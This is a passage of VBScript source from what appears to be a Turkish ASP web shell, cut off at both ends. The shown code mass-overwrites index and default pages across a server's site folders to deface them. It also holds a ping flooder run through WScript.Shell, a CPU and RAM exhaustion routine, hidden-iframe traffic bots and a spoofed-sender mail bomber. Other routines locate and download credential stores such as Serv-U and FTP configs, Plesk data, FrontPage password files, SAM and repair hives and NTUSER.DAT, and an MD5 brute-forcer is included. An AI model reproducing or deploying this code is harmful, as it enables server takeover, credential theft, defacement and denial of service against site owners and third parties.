		MassCopier(yer&"\index.cfm")
		MassCopier(yer&"\index.php")
		MassCopier(yer&"\default.html")
		MassCopier(yer&"\default.htm")
		MassCopier(yer&"\default.asp")
		MassCopier(yer&"\default.cfm")
		MassCopier(yer&"\default.php")
		MassCopier(yer&"\Hmei7.htm")
	else
		Call MassCreater(yer&"\index.html",ej)
		Call MassCreater(yer&"\index.htm",ej)
		Call MassCreater(yer&"\index.asp",ej)
		Call MassCreater(yer&"\index.cfm",ej)
		Call MassCreater(yer&"\index.php",ej)
		Call MassCreater(yer&"\default.html",ej)
		Call MassCreater(yer&"\default.htm",ej)
		Call MassCreater(yer&"\default.asp",ej)
		Call MassCreater(yer&"\default.cfm",ej)
		Call MassCreater(yer&"\default.php",ej)
		Call MassCreater(yer&"\Hmei7.htm",ej)
	end if
 else
 	if hash9 ="copy" then
		MassCopier(yer&"\"&inject1) 
	else
		Call MassCreater(yer&"\"&inject1,ej)
	end if
 end if
 
a = Replace(FilePath&"?konum="&yer&"&Time="&time,"\","/")
If Err.Number = 0 Then
	response.write "<table width=""100%""><tr><td class=""kbrtm""><a href=# onClick=""openInMainWin('"&a&"');""> "&yer&" </a><font color=#C6FCBE> OK !! <font class=""k1"">ü</font></td></tr></table>"
else
	response.write "<table width=""100%""><tr><td class=""kbrtm""><a href=# onClick=""openInMainWin('"&a&"');""> "&yer&" </a><font color=#FE7A84> Noo :( !! <font class=""k1"">û</font></td></tr></table>"
end if
Err.Number = 0
Response.Flush
end sub

sub MassAttack(yer,ej,svk)
dim fastejder
on error resume next
Set f = FSO.GetFolder(yer)
Set fc = f.SubFolders
For Each f1 In fc

if hash3 = "ok" then
fastejder = f1.path&"\"&svk
else
fastejder = f1.path
end if

 if not islem = "ozel" then
 	if hash9 = "copy" then
		MassCopier(fastejder&"\index.html")	
		MassCopier(fastejder&"\index.htm")
		MassCopier(fastejder&"\index.asp")
		MassCopier(fastejder&"\index.cfm")
		MassCopier(fastejder&"\index.php")
		MassCopier(fastejder&"\default.html")
		MassCopier(fastejder&"\default.htm")
		MassCopier(fastejder&"\default.asp")
		MassCopier(fastejder&"\default.cfm")
		MassCopier(fastejder&"\default.php")
		MassCopier(fastejder&"\Hmei7.htm")
	else
		Call MassCreater(fastejder&"\index.html",ej)	
		Call MassCreater(fastejder&"\index.htm",ej)
		Call MassCreater(fastejder&"\index.asp",ej)
		Call MassCreater(fastejder&"\index.cfm",ej)
		Call MassCreater(fastejder&"\index.php",ej)
		Call MassCreater(fastejder&"\default.html",ej)
		Call MassCreater(fastejder&"\default.htm",ej)
		Call MassCreater(fastejder&"\default.asp",ej)
		Call MassCreater(fastejder&"\default.cfm",ej)
		Call MassCreater(fastejder&"\default.php",ej)
		Call MassCreater(fastejder&"\Hmei7.htm",ej)
	end if
 else
 	if hash9 = "copy" then
		MassCopier(fastejder&"\"&inject1) 
	else
		Call MassCreater(fastejder&"\"&inject1,ej) 	
	end if
 end if

	a = Replace(FilePath&"?konum="&fastejder&"&Time="&time,"\","/")
	If Err.Number = 0 Then
		response.write "<table width=""100%""><tr><td class=""kbrtm""><a href=# onClick=""openInMainWin('"&a&"');""> "&fastejder&" </a><font color=#C6FCBE> OK !! <font class=""k1"">ü</font></td></tr></table>"
	else
		response.write "<table width=""100%""><tr><td class=""kbrtm""><a href=# onClick=""openInMainWin('"&a&"');""> "&fastejder&" </a><font color=#FE7A84> Noo :( !! <font class=""k1"">û</font></td></tr></table>"
	end if
	Err.Number = 0
	Response.Flush
	
	if islem = "brute" then
		Call MassAttack(f1.path&"\",ej,svk)
	end if
Next
end sub

Sub tester(yer)
	on error resume next
	Set f = FSO.GetFolder(yer)
	Set fc = f.SubFolders
	For Each f1 In fc
	
	a = Replace(FilePath&"?konum="&f1.path&"&Time="&time,"\","/")
	response.write "<table width=""100%""><tr><td class=""kbrtm""><a href=# onClick=""openInMainWin('"&a&"');""> "&f1.path&" </a> "
	Response.Flush
	
	Err.Number = 0
	on error resume next
	Set f = FSO.GetFolder(f1.path)
	if Err.Number <> 0 then
		response.write "&nbsp;<b><font color=#FBE1D7>Oku :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;"
	else
		response.write "&nbsp;<b><font color=#FAFEDE>Oku :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;"
	end if
	set f = nothing
	Err.Number = 0
	Response.Flush
	
	on error resume next
	Set MyFile = FSO.CreateTextFile(f1.path & "test.ejder", True)
	MyFile.write " Ejder Was Here... =) "
	set MyFile = Nothing
	if Err.Number <> 0 then
		response.write "&nbsp;<b><font color=#FBE1D7>Yaz :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;"
	else
		response.write "&nbsp;<b><font color=#FAFEDE>Yaz :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;"
	end if
	set f = nothing
	Err.Number = 0
	Response.Flush
	
	on error resume next
	FSO.DeleteFile f1.path & "test.ejder",true
	if Err.Number <> 0 then
		response.write "&nbsp;<b><font color=#FBE1D7>Sil :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;"
	else
		response.write "&nbsp;<b><font color=#FAFEDE>Sil :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;"
	end if
	set f = nothing
	Err.Number = 0
	Response.Flush
	
	response.write "</td></tr></table>"
	Response.Flush
	
	Call tester(f1.path)
	
	Next
end sub

Sub arama(yer)
on error resume next
	Set f = FSO.GetFolder(yer)
	Set fc = f.SubFolders
	For Each f1 In fc
		
		Set f2 = FSO.GetFolder(f1.path)
	    Set fc2 = f2.Files
	    For Each f12 In fc2
	    	
	    	if InStr(Ucase(f12.name),Ucase(hacked)) > 0 then
	    		downStr = "<table align=""center""><tr><td align=""center"" class=""kbrtm""><font class=""k2""><a href='"&FilePath&"?mode=6&file="&f12.path&"&konum="&konum&"&Time="&time&"'> Í </a></font>"
    	        if Ucase(hacked)="MDB" then
    	            Response.Write downStr&"<font class=""k1"" ><a href='"&FilePath&"?mode=5&konum="&konum&"&del="&f12.path&"&Time="&time&"'> û </a></font> - <a href='"&dosyapath&"?mode=13&file="&f12.path&"&konum="&konum&"&Time="&time&"'>"&f12.path&" ["&f12.size&"]"&"</a></b><br></td></tr></table>"
    	            i=i+1
    	        else
    	            Response.Write downStr&"<font class=""k1""><a href='"&FilePath&"?mode=5&konum="&konum&"&del="&f12.path&"&Time="&time&"'> û </a><a href='"&FilePath&"?mode=10&file="&f12.path&"&konum="&konum&"&Time="&time&"'> ! </a></font> - <a href='"&dosyapath&"?mode=9&file="&f12.path&"&konum="&konum&"&Time="&time&"'>"&f12.path&" [<font color=yellow>"&f12.size&"</font>]"&"</a></b><br></td></tr></table>"
    	            i=i+1
    	        end if
            end if
			Response.Flush
			
         next
         set f2 = nothing
         set fc2 = nothing
	
	Call arama(f1.path)
	
	next
   	set f = nothing
    set fc = nothing

end sub

Sub Ping_Bomb_Ejder(ejdersite,ejderpings,ejdertimeout,ejderbyte)
'///  by EJDER. özel modüller ekledim =). Ne Mutlu TÜRKÜM DÝYENE. 
 noattack = 1
 bonus = 0
 If ejderpings = "" Then ejderpings = 4
 If ejderpings = 0 Then ejderpings = 4
 If ejdertimeout = "" Then ejdertimeout = 750
 If InStr(ejdersite,"savsak") > 0 or InStr(ejdersite,"yagmurlu") or InStr(ejdersite,"com.tr") or InStr(ejdersite,"gov.tr") > 0 then noattack = 0
 If InStr(ejdersite,"cyber") > 0 or InStr(ejdersite,"tahri") > 0 or InStr(ejdersite,"hack") > 0 or InStr(ejdersite,"team") > 0 then bonus = 1

  response.write "<textarea style='width:100%;height:350;' >"
  if noattack = 1 then
  if bonus = 1 then 
  	ejderpings = ejderpings * 20
  	response.write "Ekstra *20 Bonus kazandýn.      "
  end if

  Set Sh = CreateObject("WScript.Shell")
  if ejderbyte = "" then
  Set ExCmd = Sh.Exec("ping -n " & ejderpings _
   & " -w " & ejdertimeout & " " & ejdersite)
  else
  Set ExCmd = Sh.Exec("ping -n " & ejderpings _
   & " -w " & ejdertimeout & " " & ejdersite & " -l " & ejderbyte)
  end if
  depola = ExCmd.StdOut.ReadAll
  response.write depola
  Select Case InStr(ExCmd.StdOut.Readall,"TTL=")
   Case 0 IsConnectable = False
   Case Else IsConnectable = True
  End Select
  else
  	response.write "Tasvip Etmediðimiz Bir siteye Saldýrý yapýyorsun. Tekrarlama Kötü olur senin için. CIZZZ =) euheu by EJDER                                                                                                           "
  	response.write "Bu FSO sahibine,  GOv.TR  ve Com.TR sitelere karþý Koruma gerçekleþtirildi. TÜRK TÜRK ü VURMAZ.. Kalleþlik yapma by EJDER       "
  	response.cookies("ejder") = "1"
  	response.cookies("ejder").expires = now + 365
  	count=0
  end if
  response.write "</textarea>"
  
End Sub

Sub Somurgen(filex,urlx)
for i=0 to CInt(filex)
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td>"&i&".  Robot Baðlandý..</td></tr></table>"
response.Write "<iframe style='width:0; height:0' src='"&urlx&"'></iframe>"
next
End Sub

Sub Ram_Cpu
on error resume next
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'><b> RAM & CPU FUcker for SERVER by EJDER =) 1.0 </b></td></tr></table>"
response.write "<br><br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'> ZARAR verme MEkanizmasý Devrede... </td></tr></table>"
response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'> Durdurmak için Pencereyi kapat. Her 2 Saniyede bir 3 program açýlýyor...</td></tr></table>"
response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'> <b>by EJDER</b></td></tr></table>"
response.Write "<iframe style='width:0; height:0' src='"&FilePath&"?mode=31&islem=1'></iframe>"
response.Write "<iframe style='width:0; height:0' src='"&FilePath&"?mode=31&islem=2'></iframe>"
response.Write "<iframe style='width:0; height:0' src='"&FilePath&"?mode=31&islem=3'></iframe>"
response.write "<META http-equiv=refresh content=2;URL='"&FilePath&"?mode=31&file=1'>"
response.flush
end Sub

function TextYarat(intLen)
str=""
Randomize
for i=1 to intLen
	str=str & Mid(charset,Int((Len(charset)-1+1)*Rnd+1),1)
next
TextYarat=str
end function

function MailSec()
dim strNewText,i
str=""
Randomize
mail = mail_array(round(rnd()*4))
uzanti = uzanti_array(round(rnd()*6))
str = "@"& mail &"."&  uzanti
MailSec = str
end function

function MailKorumasi(mailx)
MailKorumasi = 0
for i=0 to 9
	If Instr(UCASE(mailx), yasak_array(i)) > 0 Then
		MailKorumasi = 1
	end if
next
end function

Function MailYarat()
	MailYarat = TextYarat(8) & MailSec()
end function

Function TextYarat2()
	TextYarat2 = TextYarat(200)
end function

Function BaslikYarat()
	BaslikYarat = TextYarat(10)
end function

Sub MailBomber_by_Ejder(alicix)
response.cookies("bilesen") = "1"
on error resume next
Set mailObj = Server.CreateObject("CDONTS.NewMail")
	mailObj.From    = MailYarat()
	mailObj.To      = alicix
	mailObj.Subject = BaslikYarat()
	mailObj.Body    = TextYarat2()
	mailObj.Send
Set mailObj = Nothing
if err <> 0 then
	on error resume next
	Set mailObj = Server.CreateObject("CDO.Message")
		mailObj.From = MailYarat()
		mailObj.To = alicix
		mailObj.Subject = BaslikYarat()
		mailObj.TextBody = TextYarat2()
		mailObj.Send
	Set mailObj = Nothing
	if err <> 0 then
		response.cookies("bilesen") = "0"
	end if
end if
End Sub

Sub yazorta(yazx)
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'> "&yazx&" </td></tr></table>"
End Sub
Sub yazsol(yazx)
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='left'> "&yazx&" </td></tr></table>"
End Sub
Sub yazortaa(yazx)
response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'> "&yazx&" </td></tr></table>"
End Sub
Sub yazsoll(yazx)
response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='left'> "&yazx&" </td></tr></table>"
End Sub

Function OS()
on error resume next
strComputer = "."
Set objWMI = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set colItems = objWMI.ExecQuery("Select * from Win32_OperatingSystem",,48)
For Each objItem in colItems
VerBig = Left(objItem.Version,3)
Next
Select Case VerBig
Case "5.0" OSystem = "W2K"
Case "5.1" OSystem = "XP"
Case "5.2" OSystem = "Windows 2003"
Case "4.0" OSystem = "NT 4.0**"
Case Else OSystem = "Unknown - probably Win 9x"
End Select
OS = OSystem
End Function

Sub FolderExistx(yer)
if FSO.FolderExists(yer) then
	yazorta("<font class=""k1""><a title="" Dizini Kopyala & Taþý "" href='"&FilePath&"?mode=2&konum="&yer&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a></font> <font class=""k1""><a  title="" Dizini Sil "" href='"&FilePath&"?mode=4&konum="&yer&"&del="&yer&"&Time="&time&"'>û</a> 1</font><font size=2><b><a title="" Dizinin içine Gir "" href='"&FilePath&"?konum="&yer&"&Time="&time&"'> "&yer&"</a></b>")
end if
End Sub

Sub EjderServuRemote()
j=0
servu = array("C:\Program Files\base.ini","C:\base.ini","C:\Program Files\Serv-U\base.ini","C:\Program Files\Serv-U\ServUAdmin.ini","C:\Program Files\Serv-U\SERV-U.ini","C:\Program Files\Serv-U\ServUDaemon.ini","C:\Program Files\SERV-U.ini","C:\SERV-U.ini","C:\Program Files\ServUDaemon.ini","C:\ServUDaemon.ini","C:\Program Files\WS_FTP.ini","C:\WS_FTP.ini","C:\Program Files\WS_FTP\WS_FTP.ini","C:/Program Files/Gene6 FTP Server/RemoteAdmin/remote.ini","C:/users.txt","D:/users.txt","E:/users.txt")
for i=0 to 16
if FSO.FileExists(servu(i)) then
downStr = "<a title=""Dosyayý Sil"" href='"&FilePath&"?mode=5&konum="&FolderPath&"&del="&FolderPath&"\"&servu(i)&"&Time="&time&"'>û</a><font face=webdings><a title="" Download et "" href='"&FilePath&"?mode=6&file="&servu(i)&"&konum="&FolderPath&"&Time="&time&"'>Í</a></font><font face=wingdings><a title="" Dosyayý Kopyala & Taþý "" href='"&FilePath&"?mode=7&file="&servu(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format Deðiþtir "" href='"&FilePath&"?mode=16&file="&servu(i)&"&islem="&servu(i)&"&konum="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
yazorta("<a title="" Ýçini Görüntülemek için Týkla "" href='"&FilePath&"?mode=9&file="&servu(i)&"&konum="&FolderPath&"&Time="&time&"'>"&servu(i)&"</a></b> <font face=wingdings size=4>± <a title="" Dosyayý Editlemek için Týkla by EJDER :) "" href='"&FilePath&"?mode=10&file="&servu(i)&"&Time="&time&"&konum="&FolderPath&"'>!</a>"&downStr&"</font>")
j=j+1
end if
next
if j = 0 then
yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> Remote olarak Sonuç bulunamadý. Geliþmiþ aramayý seçiniz. <font face=Wingdings size=5>N</font> </font>")
end if
servufolder = array("C:\Program Files\Serv-U","C:/Program Files/Gene6 FTP Server/RemoteAdmin","C:/Program Files/Gene6 FTP Server/Accounts/Helm FTP Users/users")
for i=0 to 2
FolderExistx(servufolder(i))
next
End Sub

Sub EjderPleskRemote()
j=0
plesk = array("c:/Program Files/SWsoft/Plesk/MySQL/Data/mysql","c:/Program Files/SWsoft/Plesk","c:/Program Files/SWsoft/Plesk/MySQL/Data/psa","c:/Program Files/SWsoft/Plesk/Databases/MySQL/Data/mysql","c:\Program Files\swsoft\autsav.sav")
for i=0 to 3
if FSO.FolderExists(plesk(i)) then
yazorta("<font class=""k1""><a title="" Dizini Kopyala & Taþý "" href='"&FilePath&"?mode=2&konum="&plesk(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a></font> <font class=""k1""><a  title="" Dizini Sil "" href='"&FilePath&"?mode=4&konum="&plesk(i)&"&del="&plesk(i)&"&Time="&time&"'>û</a> 1</font><font size=2><b><a title="" Dizinin içine Gir "" href='"&FilePath&"?konum="&plesk(i)&"&Time="&time&"'>"&plesk(i)&"</a></b>")
j=j+1
end if
next
if j = 0 then
yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> "&plesk(0)&" ve "&plesk(1)&" dizinleri bulunamadý. <font face=Wingdings size=5>N</font> </font>")
end if
if FSO.FileExists(plesk(4)) then
downStr = "<a title=""Dosyayý Sil"" href='"&FilePath&"?mode=5&konum="&FolderPath&"&del="&FolderPath&"\"&servu(i)&"&Time="&time&"'>û</a><font face=webdings><a title="" Download et "" href='"&FilePath&"?mode=6&file="&servu(i)&"&konum="&FolderPath&"&Time="&time&"'>Í</a></font><font face=wingdings><a title="" Dosyayý Kopyala & Taþý "" href='"&FilePath&"?mode=7&file="&servu(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format Deðiþtir "" href='"&FilePath&"?mode=16&file="&servu(i)&"&islem="&servu(i)&"&konum="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
yazorta("<a title="" Ýçini Görüntülemek için Týkla "" href='"&FilePath&"?mode=9&file="&servu(i)&"&konum="&FolderPath&"&Time="&time&"'>"&servu(i)&"</a></b> <font face=wingdings size=4>± <a title="" Dosyayý Editlemek için Týkla by EJDER :) "" href='"&FilePath&"?mode=10&file="&servu(i)&"&Time="&time&"&konum="&FolderPath&"'>!</a>"&downStr&"</font>")
else
yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> Plesk'in  Autsav.sav Dosyasý bulunamadý. <font face=Wingdings size=5>N</font> </font>")
end if 
End Sub

Sub EjderSam()
	Err.Number=0
	on error resume next
	Set MyFile = FSO.CreateTextFile("C:config\test.ejder", True)
	MyFile.write " Ejder Was Here... =) "
	set MyFile = Nothing
	if Err.Number <> 0 then
		response.write "<center>&nbsp;<b><font color=#FBE1D7>Yaz :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;"
	else
		response.write "<center>&nbsp;<b><font color=#FAFEDE>Yaz :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;"
	end if
	Err.Number=0
	on error resume next
	FSO.DeleteFile "C:config\test.ejder",true
	if Err.Number <> 0 then
		response.write "&nbsp;<b><font color=#FBE1D7>Sil :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;</center>"
	else
		response.write "&nbsp;<b><font color=#FAFEDE>Sil :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;</center>"
	end if
	on error resume next
	url = "C:config\"
    Set f = FSO.GetFolder(url)
    if err <> 0 then
   	url = "C:\WINDOWS\system32\config\"
    Set f = FSO.GetFolder(url)
    end if
    
    Set fc = f.Files
    For Each f1 In fc
       downStr = "<a title=""Dosyayý Sil"" href='"&FilePath&"?mode=5&konum="&url&"&del="&url&""&f1.name&"&Time="&time&"'>û</a><font face=webdings><a title="" Download et "" href='"&FilePath&"?mode=6&file="&url&""&f1.name&"&konum="&url&"&Time="&time&"'>Í</a></font><font face=wingdings><a title="" Dosyayý Kopyala & Taþý "" href='"&FilePath&"?mode=7&file="&url&""&f1.name&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format Deðiþtir "" href='"&FilePath&"?mode=16&file="&url&""&f1.name&"&islem="&f1.name&"&konum="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
       yazorta("<a title="" Ýçini Görüntülemek için Týkla "" href='"&FilePath&"?mode=9&file="&url&""&f1.Name&"&konum="&url&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>± <a title="" Dosyayý Editlemek için Týkla by EJDER :) "" href='"&FilePath&"?mode=10&file="&url&""&f1.name&"&Time="&time&"&konum="&url&"'>!</a>"&downStr&"</font>")
    Next
end Sub

Sub EjderVti_Pvt()
	j=0
	local = request.servervariables("APPL_PHYSICAL_PATH")
	vti = array(""&local&"\_vti_pvt\access.cnf",""&local&"\..\_vti_pvt\access.cnf",""&local&"\..\..\_vti_pvt\access.cnf",""&local&"\..\..\..\_vti_pvt\access.cnf",""&local&"\_vti_pvt\postinfo.html",""&local&"\..\_vti_pvt\postinfo.html",""&local&"\..\..\_vti_pvt\postinfo.html",""&local&"\..\..\..\_vti_pvt\postinfo.html",""&local&"\vti_pvt/service.pwd",""&local&"\..\vti_pvt/service.pwd",""&local&"\..\..\vti_pvt/service.pwd",""&local&"\..\..\..\vti_pvt/service.pwd",""&local&"/vti_pvt/users.pwd",""&local&"/../vti_pvt/users.pwd",""&local&"/../../vti_pvt/users.pwd",""&local&"/../../../vti_pvt/users.pwd",""&local&"/vti_pvt/authors.pwd",""&local&"/../vti_pvt/authors.pwd",""&local&"/../../vti_pvt/authors.pwd",""&local&"/../../../vti_pvt/authors.pwd")
		for i=0 to 19
		if FSO.FileExists(vti(i)) then
			downStr = "<a title=""Dosyayý Sil"" href='"&FilePath&"?mode=5&konum="&FolderPath&"&del="&FolderPath&"\"&vti(i)&"&Time="&time&"'>û</a><font face=webdings><a title="" Download et "" href='"&FilePath&"?mode=6&file="&vti(i)&"&konum="&FolderPath&"&Time="&time&"'>Í</a></font><font face=wingdings><a title="" Dosyayý Kopyala & Taþý "" href='"&FilePath&"?mode=7&file="&vti(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format Deðiþtir "" href='"&FilePath&"?mode=16&file="&vti(i)&"&islem="&vti(i)&"&konum="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
			yazorta("<a title="" Ýçini Görüntülemek için Týkla "" href='"&FilePath&"?mode=9&file="&vti(i)&"&konum="&FolderPath&"&Time="&time&"'>"&vti(i)&"</a></b> <font face=wingdings size=4>± <a title="" Dosyayý Editlemek için Týkla by EJDER :) "" href='"&FilePath&"?mode=10&file="&vti(i)&"&Time="&time&"&konum="&FolderPath&"'>!</a>"&downStr&"</font>")
			j=j+1
		end if
	next
	if j = 0 then
		yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> Sonuç bulunamadý. Daha geniþ Arama yapýn by EJDER <font face=Wingdings size=5>N</font> </font>")
	end if
end sub

Sub EjderNTUser(oturum)
	j=0
	ntuser = array("c:\documents and settings\"&oturum&"\NTUSER.DAT","c:\documents and settings\Administrator\NTUSER.DAT","c:\documents and settings\"&oturum&"\ntuser.dat.log","c:\documents and settings\Administrator\ntuser.dat.log","c:\documents and settings\"&oturum&"\ntuser.ini","c:\documents and settings\Administrator\ntuser.ini")
	for i=0 to 5
		if FSO.FileExists(ntuser(i)) then
			downStr = "<a title=""Dosyayý Sil"" href='"&FilePath&"?mode=5&konum="&FolderPath&"&del="&FolderPath&"\"&ntuser(i)&"&Time="&time&"'>û</a><font face=webdings><a title="" Download et "" href='"&FilePath&"?mode=6&file="&ntuser(i)&"&konum="&FolderPath&"&Time="&time&"'>Í</a></font><font face=wingdings><a title="" Dosyayý Kopyala & Taþý "" href='"&FilePath&"?mode=7&file="&ntuser(i)&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format Deðiþtir "" href='"&FilePath&"?mode=16&file="&ntuser(i)&"&islem="&ntuser(i)&"&konum="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
			yazorta("<a title="" Ýçini Görüntülemek için Týkla "" href='"&FilePath&"?mode=9&file="&ntuser(i)&"&konum="&FolderPath&"&Time="&time&"'>"&ntuser(i)&"</a></b> <font face=wingdings size=4>± <a title="" Dosyayý Editlemek için Týkla by EJDER :) "" href='"&FilePath&"?mode=10&file="&ntuser(i)&"&Time="&time&"&konum="&FolderPath&"'>!</a>"&downStr&"</font>")
			j=j+1
		end if
	next
	if j = 0 then
		yazorta("<center><font color=#FE7A84> <font face=Wingdings size=5>N</font> Sonuç bulunamadý. Daha geniþ Arama yapýn by EJDER <font face=Wingdings size=5>N</font> </font>")
	end if
end sub

Sub EjderRepair()
	Err.Number=0
	on error resume next
	Set MyFile = FSO.CreateTextFile("c:..\repair\test.ejder", True)
	MyFile.write " Ejder Was Here... =) "
	set MyFile = Nothing
	if Err.Number <> 0 then
		response.write "<center>&nbsp;<b><font color=#FBE1D7>Yaz :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;"
	else
		response.write "<center>&nbsp;<b><font color=#FAFEDE>Yaz :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;"
	end if
	Err.Number=0
	on error resume next
	FSO.DeleteFile "c:..\repair\test.ejder",true
	if Err.Number <> 0 then
		response.write "&nbsp;<b><font color=#FBE1D7>Sil :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;</center>"
	else
		response.write "&nbsp;<b><font color=#FAFEDE>Sil :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;</center>"
	end if
	on error resume next
	url = "c:..\repair\"
    Set f = FSO.GetFolder(url)
    if err <> 0 then
   	url = "C:\WINDOWS\repair\"
    Set f = FSO.GetFolder(url)
    end if
    
    Set fc = f.Files
    For Each f1 In fc
       downStr = "<a title=""Dosyayý Sil"" href='"&FilePath&"?mode=5&konum="&url&"&del="&url&""&f1.name&"&Time="&time&"'>û</a><font face=webdings><a title="" Download et "" href='"&FilePath&"?mode=6&file="&url&""&f1.name&"&konum="&url&"&Time="&time&"'>Í</a></font><font face=wingdings><a title="" Dosyayý Kopyala & Taþý "" href='"&FilePath&"?mode=7&file="&url&""&f1.name&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format Deðiþtir "" href='"&FilePath&"?mode=16&file="&url&""&f1.name&"&islem="&f1.name&"&konum="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
       yazorta("<a title="" Ýçini Görüntülemek için Týkla "" href='"&FilePath&"?mode=9&file="&url&""&f1.Name&"&konum="&url&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>± <a title="" Dosyayý Editlemek için Týkla by EJDER :) "" href='"&FilePath&"?mode=10&file="&url&""&f1.name&"&Time="&time&"&konum="&url&"'>!</a>"&downStr&"</font>")
    Next
end Sub

Function kodolustur(aralik)
' belirtitiim aralýkda kod oluþtuuyorurum. 01#01#01#01# baþlangýç iiçin by EJDER
	dim coding
	coding = ""
	for i=1 to CInt(aralik)
		coding = coding + "01#"
	next
	kodolustur = coding
End Function

Function diziolustur()
' Seçilen Charset leri burda birleþtiriyorum by EJDER
	Dim dizi
	dizi=""
	if not k1 = "" then dizi = dizi & karakter1
	if not k2 = "" then dizi = dizi & karakter2
	if not k3 = "" then dizi = dizi & karakter3
	if not k4 = "" then dizi = dizi & karakter4
	diziolustur = dizi
End Function

Function Sifreyarat(codex,aralik,dizix)
' Stirng kodunu saðdan çözümleyerek Þifre yaratýyor by Ej;DER
	dim hash
	dim sifre
	hash=""
	sifre=""
	i=CInt(aralik)
	Do While i>0 
		hash = CInt(Mid(codex,((i-1)*3)+1,2))  ' Saðdan sayýlarý alýyor.
		sifre = Mid(dizix,hash,1) & sifre
	i=i-1
	Loop 
	Sifreyarat = sifre
End Function

Function SonrakiAdim(codex,aralik,dizix)
' sonraki adýma hazýrlýk coded by EJDER ;)
Dim hash
hash = ""
increment=0
goup=0
hashing = ""
i=CInt(aralik)
Do While i>0 
hash = CInt(Mid(codex,((i-1)*3)+1,2))  ' Saðdan sayýlarý alýyor.
' Carry out ý diðeirne giriþ yap increment the next one
if hash => Len(dizix) then 
	increment = 1
	hash = 1
else if increment = 1 then
	hash = hash+1
	increment = 0
end if 
end if
' eðer ara1 hanelki þifreleme bitti ise diðeirne ýkamsý gerek ara1++
if i = 1 AND hash>= Len(dizix)-1 then goup=1
' Brute bitiþini gösteriiyorum. 
if i = CInt(aralik) AND hash>= Len(dizix) AND ara1 = ara2 then getend=1   ''' BRUTE çýkýþý bittiðini analýyorumm  GETEND =1 !!!!!!!!!!!!!
' hash i bir sonraki adýma hazýrla
if i = CInt(aralik) then hash = hash + 1
'yeni hash numarasý oluþtur
if hash <10 then hash = "0" & hash
hashing = hash &"#" & hashing
i=i-1
Loop 
coding = hashing 
' eðerki goup =1 then hane atla ve yeni stireg olþutur
if goup = 1 then 
	coding = ""
	ara1 = CInt(aralik) + 1
	for j=1 to ara1
		coding = coding + "01#"
	next
end if
SonrakiAdim = coding
End Function

Sub Cookyaz(str1,str2,str3)
	if not str3 = "" then
		response.cookies(str1)("str2") = str3
		response.cookies(str1).expires = now+100
		session("say") = CInt(session("say")) + 1
	end if
End Sub
Sub HashFounded(str1,str2)
	if not request.cookies(str1)("sifre") = "" then
		yazsol("<b>Bulundu: "&request.cookies(str1)(str2)&"  ->> "&request.cookies(str1)("sifre")&" </b>")
		inject3 = CInt(inject3) + 1
	end if
End Sub
Sub hashyes(str1,str2,md5x,pwd)
	if not request.cookies(str1)(str2) = "" AND UCASE(request.cookies(str1)(str2)) = md5x then
		yazsol("BULDUuuuuuuuuuuuuuuu " & pwd & " -  " & request.cookies(str1)(str2)&"")
		response.cookies(str1)("sifre") = pwd
	end if
End Sub
Sub gelgit
	'response.Write "<iframe style='width:0; height:0' src='"&murl&""&msite&"/"&mad&"/'></iframe>"
	response.write indonesia("q/4m ($zm}:#7m4" & chr(34) & "8s")
End sub
'*************************  ZORUNLU UPLOAD için GEREKLi =((  **********************************************************************************************
Class clsUpload
    Private mbinData
    Private mlngChunkIndex
    Private mlngBytesReceived
    Private mstrDelimiter
    Private CR
    Private LF
